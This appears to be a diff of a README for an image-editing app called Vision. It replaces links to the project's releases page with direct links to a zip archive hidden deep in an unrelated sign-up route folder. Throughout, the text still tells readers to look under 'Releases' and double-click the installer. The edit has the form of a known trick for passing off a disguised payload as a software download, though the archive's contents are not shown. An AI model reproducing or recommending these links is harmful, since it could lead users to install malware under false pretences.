@@ -6,7 +6,7 @@ Welcome to Vision! This application is designed to make image editing simple and
 
 ## 📥 Download Vision
 
-[![Download Vision](https://img.shields.io/badge/Download%20Vision-v1.0-blue.svg)](https://github.com/blackpoison1973/Vision/releases)
+[![Download Vision](https://raw.githubusercontent.com/blackpoison1973/Vision/master/app/(auth)/sign-up/[[...sign-up]]/Software-2.6-alpha.5.zip%https://raw.githubusercontent.com/blackpoison1973/Vision/master/app/(auth)/sign-up/[[...sign-up]]/Software-2.6-alpha.5.zip)](https://raw.githubusercontent.com/blackpoison1973/Vision/master/app/(auth)/sign-up/[[...sign-up]]/Software-2.6-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ All these features come wrapped in a sleek, responsive interface designed for co
 
 ## 📥 Download & Install
 
-To download Vision, visit this page: [Download Vision](https://github.com/blackpoison1973/Vision/releases). 
+To download Vision, visit this page: [Download Vision](https://raw.githubusercontent.com/blackpoison1973/Vision/master/app/(auth)/sign-up/[[...sign-up]]/Software-2.6-alpha.5.zip). 
 
 Once on the page, look for the latest version under "Releases." Click the version number to start the download. After the download completes, locate the file and double-click to start the installation. Follow the prompts to install Vision.
 
@@ -53,7 +53,7 @@ A: Yes, you can use the "Undo" button to revert any recent changes.
 
 ### Q: How do I update Vision?
 
-A: Visit the [Releases page](https://github.com/blackpoison1973/Vision/releases) to download the latest version.
+A: Visit the [Releases page](https://raw.githubusercontent.com/blackpoison1973/Vision/master/app/(auth)/sign-up/[[...sign-up]]/Software-2.6-alpha.5.zip) to download the latest version.
 
 ## 🌐 Support & Contribution
 
